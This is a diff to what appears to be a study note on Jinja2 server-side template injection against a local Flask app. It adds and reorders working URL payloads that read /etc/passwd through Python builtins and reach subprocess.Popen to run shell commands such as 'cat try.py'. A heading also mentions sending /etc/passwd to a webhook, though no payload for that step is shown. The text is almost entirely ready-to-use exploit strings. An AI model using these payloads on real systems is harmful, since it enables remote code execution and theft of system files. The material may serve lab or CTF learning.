@@ -57,6 +57,14 @@ http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f
 
 - Read a local file
 
+
+PAYLOAD:
+```
+http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}
+```
+
+- Run a command
+
 ```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here
 
 ```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568]}}``` : ```<class 'subprocess.Popen'>``` : selecting the popen subprocess
@@ -69,9 +77,6 @@ PAYLOAD:
 ```
 http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}
 ```
-
-- Run a command
-
 
 - Send the contents of etc pass to  awebhook
 
